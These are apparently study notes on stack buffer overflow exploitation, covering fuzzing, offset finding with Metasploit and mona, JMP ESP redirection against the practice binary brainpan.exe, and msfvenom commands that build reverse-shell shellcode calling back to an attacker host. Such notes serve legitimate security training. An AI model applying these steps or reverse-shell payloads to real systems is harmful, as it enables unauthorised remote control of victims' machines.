### Buffer Overflows

#### The Process:
- 1 Spiking
- 2 Fuzzing
- 3 Finding the Offset
- 4 Overwriting the EIP
- 5 Finding Bad Characters [ref: https://ostermiller.org/calc/asciism.html]
- 6 Finding the Right Module
- 7 Generating Shellcode
- 8 Gain Root Access

# BOF
**1. Check buffer length to trigger overflow**  

**2. Cofirm overflow length, append "A" * length**  

**3. Generate Offset to check EIP, ESP location**  
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

	Record value on EIP, select ESP and click "Follow in Dump"  
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> -l <length>  

	Use !mona to find the offset after the overflow  
	!mona findmsp  

**4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode**

**5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
Add code:

	badchar = [0x00]
	for ch in range (0x00 , 0xFF+1):
		if ch not in badchar:
			<payload> += chr(ch)

**6. Find JMP ESP address in the system.**
	JMP ESP = FFE4

	!mona jmp -r esp -cpb "\x00\x0A" << bad character

	!mona modules
	!mona find -s "\xff\xe4" -m brainpan.exe

	check the value of the address by naviate to it.
	Set breakpoint
	Change "B" in EIP to the address of JMP ESP << littile edian

	e.g. 0x311712f3 >> "\xf3\x12\x17\x31"

	Run again to check is the breakpoint triggered

**7. Add shellcode**
	Add a few \x90 before shellcode to avoid shellcode being modify

	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"

**Bonus: Running out of shell code space?**
Use the front of payload instead
1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address
	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

	JMP EAX/EBX/ECX/EDX

3. Append the address as shell code.
4. Add payload to the front
